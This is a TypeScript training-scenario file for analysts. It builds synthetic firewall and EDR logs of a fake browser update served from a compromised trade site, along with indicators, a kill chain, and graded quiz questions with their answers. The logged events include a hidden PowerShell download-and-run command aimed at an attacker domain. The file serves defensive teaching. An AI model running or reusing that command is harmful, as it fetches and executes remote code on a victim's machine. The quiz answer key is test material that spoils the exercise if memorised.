/**
 * Scenario pack: "Fake Browser Update — Drive-by on a Trusted Site"
 *
 * BEGINNER tier. One user, one laptop, no lateral movement. A legitimate,
 * business-categorised website the user visits regularly has been compromised
 * and serves an overlay telling her Chrome is out of date. She downloads the
 * "update", which is a JScript file, and runs it.
 *
 * The teaching point is where the incident STARTS. The first hostile domain in
 * the chain is not a typosquat and not in any blocklist — it is a real trade
 * publication with a clean category, which is why the proxy allowed it and why
 * an analyst scanning for "suspicious domain" finds nothing. The signal is the
 * shape of the sequence: a page in one site handing off to a download from a
 * different, unrelated host, followed by a script interpreter starting from the
 * Downloads folder.
 *
 * Covers T1189 (Drive-by Compromise), an initial-access technique the live feed
 * exercises but no room previously taught.
 *
 * NOTE: `difficulty: "beginner"` is declared on the SCENARIOS registry entry in
 * scenarios.ts (ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildFakeBrowserUpdateScenario(
  scenarioId = "fake-browser-update-2026",
): ScenarioBundle {
  const B = new Date("2026-06-18T13:42:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-4471", ip: "10.14.22.108" };
  const victim = { email: "d.rosen@nexacorp.com", name: "Dana Rosen", sam: "d.rosen" };

  // The compromised site is genuine and categorised as business/news — this is
  // the entire point of the scenario.
  const compromisedSite = "logisticsweekly.com";
  const stagingHost = "cdn-static-assets-92.net";
  const c2 = "api-telemetry-sync.com";

  const scriptHash = makeSha256("fake_chrome_update_jscript_dropper_2026");
  const wscriptHash = makeSha256("windows_system32_wscript_exe_signed_microsoft");
  const powershellHash = makeSha256("windows_powershell_v1_signed_microsoft");

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. Ordinary browsing. Clean category, allowed, nothing to see.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_01_site_visit",
      ts: T(0),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      user_title: "Logistics Coordinator",
      src_ip: host.ip,
      severity: "low",
      description:
        "LAP-4471 loaded an article page on logisticsweekly.com at 13:42, allowed under the category business-and-economy.",
      network: {
        url: `https://${compromisedSite}/2026/06/port-congestion-outlook`,
        domain: compromisedSite,
        method: "GET",
        status: 200,
        bytes_in: 148_320,
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "185.199.108.153",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "business-and-economy",
        "pan.url": `${compromisedSite}/2026/06/port-congestion-outlook`,
        "pan.http_method": "GET",
        "pan.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "884120",
        "source.ip": host.ip,
        "url.domain": compromisedSite,
        "http.response.status_code": "200",
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 2. The injected overlay pulls its payload from an unrelated host.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_02_overlay_fetch",
      ts: T(1 * MIN + 12_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "low",
      mitre_technique: "T1189",
      mitre_tactic: "Initial Access",
      description:
        "Seventy-two seconds into the page view, the same browser session requested /loader/update-check.js from cdn-static-assets-92.net, referred by the logisticsweekly.com article.",
      network: {
        url: `https://${stagingHost}/loader/update-check.js`,
        domain: stagingHost,
        method: "GET",
        status: 200,
        bytes_in: 12_744,
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "91.219.238.14",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "computer-and-internet-info",
        "pan.url": `${stagingHost}/loader/update-check.js`,
        "pan.referer": `https://${compromisedSite}/2026/06/port-congestion-outlook`,
        "pan.http_method": "GET",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "884147",
        "source.ip": host.ip,
        "url.domain": stagingHost,
        "http.response.status_code": "200",
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 3. The user downloads the "update". A file lands in Downloads.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_03_download",
      ts: T(3 * MIN + 40_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1189",
      mitre_tactic: "Initial Access",
      description:
        "At 13:45:40 the same host downloaded Chrome_Update_127.0.6533.js from cdn-static-assets-92.net over the same session.",
      file: { name: "Chrome_Update_127.0.6533.js", path: "/download/Chrome_Update_127.0.6533.js", extension: "js", size: 341_902, sha256: scriptHash },
      network: {
        url: `https://${stagingHost}/download/Chrome_Update_127.0.6533.js`,
        domain: stagingHost,
        method: "GET",
        status: 200,
        bytes_in: 341_902,
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "file",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "91.219.238.14",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "computer-and-internet-info",
        "pan.url": `${stagingHost}/download/Chrome_Update_127.0.6533.js`,
        "pan.filename": "Chrome_Update_127.0.6533.js",
        "pan.filetype": "script",
        "pan.file_hash": scriptHash,
        "pan.direction": "server-to-client",
        "pan.session_id": "884147",
        "source.ip": host.ip,
        "url.domain": stagingHost,
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 4. The file is written to disk, as the endpoint saw it.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_04_file_write",
      ts: T(3 * MIN + 44_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "low",
      description:
        "chrome.exe wrote C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js at 13:45:44.",
      file: {
        name: "Chrome_Update_127.0.6533.js",
        path: "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js",
        extension: "js",
        size: 341_902,
        sha256: scriptHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "FileWritten",
        "crowdstrike.sensor.id": "b3e7d1904f2a4c88a1e5602d7fc3b914",
        "event.action": "file_created",
        "file.name": "Chrome_Update_127.0.6533.js",
        "file.path": "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js",
        "file.extension": "js",
        "file.size": "341902",
        "file.hash.sha256": scriptHash,
        "process.name": "chrome.exe",
        "process.pid": "8104",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 5. The user runs it. wscript.exe from Downloads, parent explorer.exe.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_05_wscript",
      ts: T(5 * MIN + 8_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1204.002",
      mitre_tactic: "Execution",
      description:
        "At 13:47:08 explorer.exe started wscript.exe with the downloaded .js file as its argument.",
      process: {
        name: "wscript.exe",
        pid: 9312,
        path: "C:\\Windows\\System32\\wscript.exe",
        parent_name: "explorer.exe",
        parent_pid: 3560,
        cmdline: 'wscript.exe "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js"',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: wscriptHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": "b3e7d1904f2a4c88a1e5602d7fc3b914",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "wscript.exe",
        "process.pid": "9312",
        "process.executable": "C:\\Windows\\System32\\wscript.exe",
        "process.command_line": 'wscript.exe "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js"',
        "process.hash.sha256": wscriptHash,
        "process.signed": "true",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3560",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 6. The script fetches its second stage.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_06_powershell",
      ts: T(5 * MIN + 11_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      description:
        "Three seconds later wscript.exe spawned powershell.exe with a download-and-run command line pointing at api-telemetry-sync.com.",
      process: {
        name: "powershell.exe",
        pid: 9388,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "wscript.exe",
        parent_pid: 9312,
        cmdline:
          "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: powershellHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "2048",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.sensor.id": "b3e7d1904f2a4c88a1e5602d7fc3b914",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "9388",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line":
          "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
        "process.hash.sha256": powershellHash,
        "process.parent.name": "wscript.exe",
        "process.parent.pid": "9312",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 7. The second-stage fetch is refused at the perimeter.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_07_c2_blocked",
      ts: T(5 * MIN + 12_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_blocked",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      description:
        "The outbound request to api-telemetry-sync.com/s/2 was denied under the category newly-registered-domain.",
      network: { url: `https://${c2}/s/2`, domain: c2, method: "GET", status: 0 },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "block-url",
        "pan.rule": "BLOCK-NEWLY-REGISTERED",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "45.61.136.90",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "newly-registered-domain",
        "pan.url": `${c2}/s/2`,
        "pan.session_id": "884203",
        "source.ip": host.ip,
        "url.domain": c2,
        "action_result": "block-url",
      },
    },

    // ---------------------------------------------------------------------
    // 8. The EDR verdict, with the process tree it based it on.
    // ---------------------------------------------------------------------
    {
      id: "evt_fbu_08_edr_alert",
      ts: T(5 * MIN + 30_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Falcon raised a Critical detection on LAP-4471 for the explorer → wscript → powershell chain and killed the PowerShell process.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "ScriptBasedDropperFromBrowserDownload",
        "crowdstrike.detection.description":
          "A script interpreter launched from a browser download directory spawned PowerShell with a remote download command.",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.severity_name": "Critical",
        "crowdstrike.detection.confidence": "90",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.detection.parent_process": "explorer.exe",
        "crowdstrike.detection.process_tree":
          "explorer.exe > wscript.exe > powershell.exe",
        "crowdstrike.sensor.id": "b3e7d1904f2a4c88a1e5602d7fc3b914",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.falcon_host_link": "https://falcon.crowdstrike.com/activity/detections/detail/b3e7d190",
        "event.action": "alert",
        "event.outcome": "blocked",
        "host.name": host.hostname,
        "host.ip": host.ip,
        "user.name": `NEXACORP\\${victim.sam}`,
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "domain",
      value: stagingHost,
      first_seen: T(1 * MIN + 12_000),
      last_seen: T(3 * MIN + 40_000),
      reputation: "malicious",
      tags: ["payload-staging", "fake-update"],
    },
    {
      type: "domain",
      value: c2,
      first_seen: T(5 * MIN + 12_000),
      last_seen: T(5 * MIN + 12_000),
      reputation: "malicious",
      tags: ["c2", "newly-registered"],
    },
    {
      type: "sha256",
      value: scriptHash,
      first_seen: T(3 * MIN + 40_000),
      last_seen: T(5 * MIN + 8_000),
      reputation: "malicious",
      tags: ["jscript", "dropper"],
    },
    {
      // The compromised site is a real business resource that many staff use.
      // It is part of the chain, but blocklisting a legitimate trade
      // publication is a business decision, not an analyst reflex.
      type: "domain",
      value: compromisedSite,
      first_seen: T(0),
      last_seen: T(1 * MIN + 12_000),
      reputation: "suspicious",
      tags: ["compromised-legitimate-site", "referrer"],
    },
    {
      type: "host",
      value: host.hostname,
      first_seen: T(0),
      last_seen: T(5 * MIN + 30_000),
      reputation: "unknown",
      tags: ["user-endpoint", "affected"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "Where does this incident actually begin? Pick the earliest event that is part of the attack rather than ordinary user behaviour.",
      hint: "Compare the domain and the referer in evt_fbu_02 with the page loaded in evt_fbu_01.",
      kind: "single",
      options: [
        { value: "overlay", label: "evt_fbu_02_overlay_fetch — the article page pulled a script from an unrelated host" },
        { value: "site", label: "evt_fbu_01_site_visit — visiting logisticsweekly.com was the malicious act" },
        { value: "wscript", label: "evt_fbu_05_wscript — nothing malicious happened until the user ran the file" },
        { value: "c2", label: "evt_fbu_07_c2_blocked — the first event the firewall actually treated as bad" },
      ],
      answer: "overlay",
      xp: 50,
      explanation:
        "evt_fbu_01 is a real employee reading a real trade publication — a legitimate action that happens hundreds of times a week. The attack becomes visible one event later, when that same page hands off to cdn-static-assets-92.net, a host with no relationship to the publisher, carrying the article URL as its referer. That hand-off is drive-by compromise (T1189). Choosing evt_fbu_05 (c) is the common mistake: the user's double-click is the loudest event, but by then the attack has already been running for four minutes. Choosing evt_fbu_07 (d) means letting the firewall's categorisation decide where your incident starts — it blocked the third hostile domain and missed the first two.",
    },
    {
      id: "q2",
      prompt:
        "The proxy allowed both logisticsweekly.com and cdn-static-assets-92.net. Why did category filtering not stop this?",
      kind: "single",
      options: [
        { value: "categories_clean", label: "Both carried benign categories — a real publisher, and generic internet infrastructure" },
        { value: "tls", label: "The sessions were encrypted, so the firewall had no visibility into the URLs at all" },
        { value: "rule_off", label: "The CORP-WEB-OUTBOUND rule was in monitor-only mode and blocked nothing" },
        { value: "whitelist", label: "Both domains were on an explicit corporate allowlist" },
      ],
      answer: "categories_clean",
      xp: 40,
      explanation:
        "pan.category is business-and-economy for the publisher and computer-and-internet-info for the staging host. Neither is a category anyone blocks — the first is a genuine business resource, and the second is the bucket most CDNs and API endpoints fall into. Category filtering answers 'what kind of site is this', which is a question a compromised legitimate site passes easily. Option (b) is wrong on the evidence: the firewall logged full URLs, filenames and a file hash, so TLS inspection was clearly on. Option (c) is contradicted by evt_fbu_07, where the same rule set produced a block. This is why the third domain was caught and the first two were not — newly-registered-domain is a behavioural signal, not a content category.",
    },
    {
      id: "q3",
      prompt:
        "Which single detail in evt_fbu_05_wscript would make you treat this as malicious even if you knew nothing about the domains?",
      kind: "single",
      options: [
        { value: "downloads_script", label: "A script interpreter running a .js file straight out of the Downloads folder, started by explorer.exe" },
        { value: "unsigned", label: "wscript.exe was unsigned, which means it had been replaced on disk" },
        { value: "integrity", label: "The process ran at medium integrity, which is an elevation" },
        { value: "pid", label: "The parent PID is lower than the child PID, showing process-tree tampering" },
      ],
      answer: "downloads_script",
      xp: 50,
      explanation:
        "wscript.exe is a legitimate signed Microsoft binary, and process.signed is 'true' in the raw event — so (b) is factually contradicted by the log. Its argument is what matters: a .js file in C:\\Users\\d.rosen\\Downloads, launched by explorer.exe, which means a human double-clicked it. Legitimate software installs itself with an installer or a package manager; almost nothing legitimate ships as a loose script the user is asked to run from Downloads. Medium integrity (c) is the ordinary level for a standard user process, not an elevation. And (d) describes normal behaviour — child processes routinely get higher PIDs than their parents.",
    },
    {
      id: "q4",
      prompt:
        "You are closing the ticket. Which statement is supported by the evidence in front of you?",
      kind: "single",
      options: [
        { value: "blocked_but_ran", label: "The dropper executed on the host, but the second-stage download was blocked and the process was killed" },
        { value: "nothing_ran", label: "The firewall blocked the attack before anything executed on the endpoint" },
        { value: "full_compromise", label: "The second stage was retrieved and the host should be treated as fully compromised" },
        { value: "site_malicious", label: "logisticsweekly.com is an attacker-controlled domain and should be permanently blocklisted" },
      ],
      answer: "blocked_but_ran",
      xp: 60,
      explanation:
        "Both halves are evidenced. Code ran: evt_fbu_05 and evt_fbu_06 are process-creation events on LAP-4471, so the JScript executed and reached the point of spawning PowerShell. And the payload never arrived: evt_fbu_07 shows pan.action block-url on the second-stage URL, and evt_fbu_08 records pattern_disposition_description 'Detection, Process Killed'. Option (b) understates it — saying nothing executed is wrong, and it changes what you do next, because a host that ran attacker script still needs a look for anything the first stage did locally. Option (c) overstates it against a clear block. Option (d) confuses a compromised victim site with attacker infrastructure; the publisher needs to be notified, and blocklisting a resource the logistics team reads daily is a business call, not an analyst reflex.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Fake Browser Update — Drive-by on a Trusted Site",
    threat_actor: "Commodity drive-by operator (fake-update lure)",
    attack_kind: "fake_browser_update",
    briefing:
      "CrowdStrike Falcon raised a Critical detection on LAP-4471 at 13:47 for a script interpreter spawning PowerShell. The user was browsing at the time. Work out how the file got onto the machine and how far the attack got.",
    narrative: `At 13:42 Dana Rosen opened an article on logisticsweekly.com, a trade publication she reads most days. The firewall allowed it under the category business-and-economy, which is exactly right — the site is genuine, and it is also, today, compromised.

Seventy-two seconds later the same browser session fetched /loader/update-check.js from cdn-static-assets-92.net, carrying the article URL as its referer. Nothing about that host is related to the publisher. It served the overlay that told her Chrome was out of date, and at 13:45:40 she downloaded Chrome_Update_127.0.6533.js from it. Falcon recorded the file landing in her Downloads folder four seconds later.

At 13:47:08 she ran it. explorer.exe started wscript.exe with the .js file as its argument — the signature of a human double-clicking a downloaded script. Three seconds after that, wscript spawned PowerShell with a hidden window, an execution-policy bypass and a one-line download-and-run against api-telemetry-sync.com.

That request was refused. The firewall blocked the URL under newly-registered-domain, and Falcon killed the PowerShell process on the same detection. The second stage never arrived.

Two of the three hostile domains in this chain carried clean categories, and the one that was blocked was blocked for its registration age rather than its content. Nothing about the first four minutes of this incident looks like an attack if you are searching for bad domains.`,
    learning_objectives: [
      "Identify drive-by compromise (T1189) from a page on one site handing off to a download from an unrelated host",
      "Use the HTTP referer field to reconstruct which page originated a request",
      "Recognise that URL category filtering cannot catch a compromised legitimate site",
      "Read a process tree (explorer → wscript → powershell) and explain what each step proves about user action",
      "Separate 'the payload was blocked' from 'nothing executed' when writing a verdict",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Initial Access", action: "User loads a genuine article on a compromised trade publication" },
      { ts: T(1 * MIN + 12_000), phase: "Initial Access", action: `Injected overlay pulls update-check.js from ${stagingHost} (T1189)` },
      { ts: T(3 * MIN + 40_000), phase: "Initial Access", action: "User downloads Chrome_Update_127.0.6533.js" },
      { ts: T(5 * MIN + 8_000), phase: "Execution", action: "explorer.exe → wscript.exe runs the downloaded script (T1204.002)" },
      { ts: T(5 * MIN + 11_000), phase: "Execution", action: "wscript spawns hidden PowerShell with a download-and-run command" },
      { ts: T(5 * MIN + 12_000), phase: "Command and Control", action: `Second-stage fetch from ${c2} blocked at the perimeter` },
      { ts: T(5 * MIN + 30_000), phase: "Containment", action: "Falcon kills the PowerShell process and raises a Critical detection" },
    ],
    questions,
  };
}
